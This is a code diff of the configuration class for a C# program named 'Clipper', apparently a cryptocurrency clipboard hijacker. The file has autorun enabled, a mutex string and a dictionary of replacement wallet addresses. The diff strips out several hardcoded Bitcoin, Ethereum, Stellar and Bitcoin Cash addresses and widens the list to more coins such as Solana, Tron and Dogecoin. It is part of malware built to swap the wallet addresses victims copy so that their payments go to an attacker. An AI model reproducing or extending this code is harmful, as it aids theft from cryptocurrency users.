@@ -2,7 +2,7 @@
 
 namespace Clipper
 {
-    internal sealed class config
+    internal class config
     {
         // Autorun
         public static bool autorun_enabled = true;
@@ -16,18 +16,25 @@ namespace Clipper
         // Replace 
         public static Dictionary<string, string> addresses = new Dictionary<string, string>()
         {
-            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" }, // Bitcoin
-            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" }, // Ethereum
+            {"btc", "" }, // Bitcoin
+            {"eth", "" }, // Ethereum
             {"xmr", "" }, // Monero
-            {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
             {"xrp", "" }, // Ripple
             {"ltc", "" }, // Litecoin
             {"nec", "" }, // Neocoin
-            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
-            {"dash", "" } // Dashcoin
+            {"bch", "" }, // Bitcoin Cash
+            {"dash", "" }, // Dashcoin
+            {"bnb", "" }, // Binance coin
+            {"sol", "" }, // Solana
+            {"trx", "" }, // Tron
+            {"ada", "" }, // Cardano
+            {"doge", "" }, // Dogecoin
+            {"xlm", "" }, // Stellar
+            {"rvn", "" } // Ravencoin
         };
+        
         // Mutex (random)
-        public static string mutex = "a1sfrewrfwerewsf231";
+        public static string mutex = "asdasdAOPSFJoaSFlkhakbgskQOh92h1oiAKSBaiys9daigskfbaskfbasf";
 
     }
 }
